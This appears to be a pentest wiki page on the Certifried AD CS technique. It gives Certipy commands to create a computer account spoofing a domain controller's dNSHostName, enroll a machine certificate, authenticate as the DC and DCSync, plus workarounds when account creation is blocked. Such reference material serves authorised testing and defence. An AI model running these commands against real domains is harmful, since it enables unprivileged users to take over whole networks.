---
title: "Certifried: machine certificate for a domain controller's identity"
order: 7
description: "Abusing the default machine-account creation right and a weak certificate-to-account mapping by creating a computer, setting its dNSHostName to a domain controller's, and enrolling a machine certificate that authenticates as that DC."
keywords:
  - Certifried
  - dNSHostName
  - machine account
  - Certipy
  - certificate mapping
---

# Certifried

Certifried turns the default **machine-account quota** into a domain controller takeover. By default any user can create computer accounts, and an enrolled machine certificate is mapped back to an account by its **`dNSHostName`**. If you create a computer, set its `dNSHostName` to match a **domain controller's**, and enroll on a machine template, the issued certificate maps to the **DC**, so you can authenticate as the DC and DCSync. It needs a standard domain user and a reachable enterprise CA, and it works where **strong certificate mapping is not enforced**: the 2022 strong-mapping enforcement embeds the requesting machine's SID in the certificate and the KDC rejects the mismatched DC mapping, so scope this to systems without that enforcement or with explicitly weakened mapping.

## The attack

```bash
# 1. Create a computer account and set its dNSHostName to the target DC's FQDN
certipy account create -u user@example.local -p <password> -user 'attacker$' \
  -pass 'Password123!' -dns dc01.example.local -dc-ip <dc>

# 2. Enroll a certificate on a machine template as that computer
certipy req -u 'attacker$'@example.local -p 'Password123!' -ca 'EXAMPLE-CA' -template Machine -dc-ip <dc>

# 3. The certificate maps to the DC; authenticate and recover the DC credentials
certipy auth -pfx dc01.pfx -dc-ip <dc>
```

## Exploitation notes

- The leverage is the **machine-account quota** (default 10) plus the `dNSHostName`-based mapping, so a plain domain user reaches a DC identity with no special rights.
- It is closely related to [certificate mapping](certificate-mapping.md) weaknesses: Certifried exploits how the CA and KDC resolve a certificate to an account, which the strong-mapping hardening later tightened.
- Where the quota is zero or creation is denied, reuse an existing computer you control and rewrite its `dNSHostName` instead, if you hold write over it.
- The payoff is a certificate for the **DC machine account**, which via [pass-the-certificate](theft-and-pass-the-certificate.md) gives DCSync, so this is a direct domain-compromise path from an unprivileged user.

## Tools

- **Certipy** (`account create`, `req`, `auth`): create the computer, enroll, and authenticate as the DC.
- **addcomputer.py / impacket**: alternative computer-account creation where needed.

## References

- [Certipy wiki: privilege escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [HackTricks: AD CS domain escalation](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)
- [The Hacker Recipes: AD CS certificate templates](https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates)
